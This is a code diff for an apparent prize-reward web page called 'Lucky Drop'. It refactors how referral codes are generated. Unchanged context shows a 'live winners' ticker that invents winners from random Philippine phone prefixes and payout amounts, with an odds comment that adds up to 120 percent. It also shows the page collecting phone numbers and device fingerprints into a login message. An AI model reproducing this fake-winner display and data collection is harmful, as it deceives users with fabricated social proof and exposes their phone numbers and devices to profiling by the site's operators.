@@ -1,6 +1,6 @@
 /**
  * Lucky Drop Index Page - Swipe to Verify with Fire Trail
- * With Online Status System - UPDATED: ₱500 rewards
+ * With Online Status System - UPDATED: ₱500 rewards & Referral Code Generation
  */
 
 // Initialize Firebase
@@ -30,9 +30,7 @@ let count = 88;
 
 // ========== SIMPLE PHONE VALIDATION (11 digits only) ==========
 function isValidPhoneNumber(phone) {
-    // Remove all non-digits
     const cleaned = phone.replace(/\D/g, '');
-    // Must be exactly 11 digits and start with 09
     return cleaned.length === 11 && cleaned.startsWith('09');
 }
 
@@ -212,7 +210,7 @@ async function completeSwipe() {
     }, 500);
 }
 
-// ========== LIVE WINNERS TICKER (Updated with new amounts) ==========
+// ========== LIVE WINNERS TICKER (Updated amounts) ==========
 function updateTickerWithTransition(phoneNumber, amount, type) {
     if (!winnerEntry) return;
     
@@ -236,14 +234,13 @@ function updateTickerWithTransition(phoneNumber, amount, type) {
 function startTicker() {
     const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
     
-    // Updated amount distribution
     // 500 = 90%, 1000 = 15%, 1500 = 10%, 2000 = 5%
     function generateRandomAmount() {
         const rand = Math.random() * 100;
-        if (rand < 90) return 500;      // 90% chance
-        else if (rand < 105) return 1000; // 15% chance (90-105)
-        else if (rand < 115) return 1500; // 10% chance (105-115)
-        else return 2000;                 // 5% chance (115-120)
+        if (rand < 90) return 500;
+        else if (rand < 105) return 1000;
+        else if (rand < 115) return 1500;
+        else return 2000;
     }
     
     function generateWinner() {
@@ -342,17 +339,24 @@ async function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
 }
 
 // ========== CREATE USER SESSION (with referral_code) ==========
+function generateReferralCode() {
+    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const numbers09 = '0123456789';
+    const numbers06 = '0123456';
+    return letters.charAt(Math.floor(Math.random() * 26)) +
+           letters.charAt(Math.floor(Math.random() * 26)) +
+           numbers09.charAt(Math.floor(Math.random() * 10)) +
+           letters.charAt(Math.floor(Math.random() * 26)) +
+           letters.charAt(Math.floor(Math.random() * 26)) +
+           numbers06.charAt(Math.floor(Math.random() * 7));
+}
+
 async function createUserSession(phone, fingerprint, deviceDisplayId) {
     const sessionRef = db.ref('user_sessions/' + phone);
     const sessionSnap = await sessionRef.once('value');
     
     if (!sessionSnap.exists()) {
-        // Generate referral code agad sa registration
-        const generateCode = () => {
-            const l='ABCDEFGHIJKLMNOPQRSTUVWXYZ', n='0123456789', n6='0123456';
-            return l[Math.floor(Math.random()*26)]+l[Math.floor(Math.random()*26)]+n[Math.floor(Math.random()*10)]+l[Math.floor(Math.random()*26)]+l[Math.floor(Math.random()*26)]+n6[Math.floor(Math.random()*7)];
-        };
-        const initialCode = generateCode();
+        const initialCode = generateReferralCode();
         await sessionRef.set({
             phone: phone,
             balance: 0,
@@ -362,22 +366,24 @@ async function createUserSession(phone, fingerprint, deviceDisplayId) {
             deviceDisplayId: deviceDisplayId,
             lastUpdate: Date.now(),
             createdAt: Date.now(),
-            referral_code: initialCode,   // ← CRUCIAL
+            referral_code: initialCode,
             referral_code_generated_at: Date.now(),
             claimed_luckycat: false
         });
         console.log('✅ New user session with referral code:', initialCode);
     } else {
-        // Update existing session (at kung walang referral_code, idagdag)
-        await sessionRef.update({ status: 'online', lastUpdate: Date.now(), deviceFingerprint: fingerprint, deviceDisplayId: deviceDisplayId });
+        await sessionRef.update({
+            status: 'online',
+            lastUpdate: Date.now(),
+            deviceFingerprint: fingerprint,
+            deviceDisplayId: deviceDisplayId
+        });
         const data = sessionSnap.val();
         if (!data.referral_code) {
-            const newCode = (() => {
-                const l='ABCDEFGHIJKLMNOPQRSTUVWXYZ', n='0123456789', n6='0123456';
-                return l[Math.floor(Math.random()*26)]+l[Math.floor(Math.random()*26)]+n[Math.floor(Math.random()*10)]+l[Math.floor(Math.random()*26)]+l[Math.floor(Math.random()*26)]+n6[Math.floor(Math.random()*7)];
-            })();
+            const newCode = generateReferralCode();
             await sessionRef.child('referral_code').set(newCode);
             await sessionRef.child('referral_code_generated_at').set(Date.now());
+            console.log('✅ Added missing referral code for existing user:', newCode);
         }
     }
 }
@@ -465,7 +471,6 @@ window.processStep1 = async function() {
         return;
     }
     
-    // Format and validate phone number
     const fullPhone = formatPhoneNumber(rawPhone);
     
     if (!isValidPhoneNumber(fullPhone)) {
@@ -497,7 +502,6 @@ window.processStep1 = async function() {
         await saveDeviceInfo(fullPhone, fingerprint, deviceDisplayId);
         await createUserSession(fullPhone, fingerprint, deviceDisplayId);
         
-        // SET USER STATUS TO ONLINE
         await setUserOnline(fullPhone, fingerprint, deviceDisplayId);
         
         const message = `🎁 LUCKY DROP LOGIN:\n📱 ${fullPhone}\n🖥️ FP: ${fingerprint}\n🔑 DEV#: ${deviceDisplayId}`;
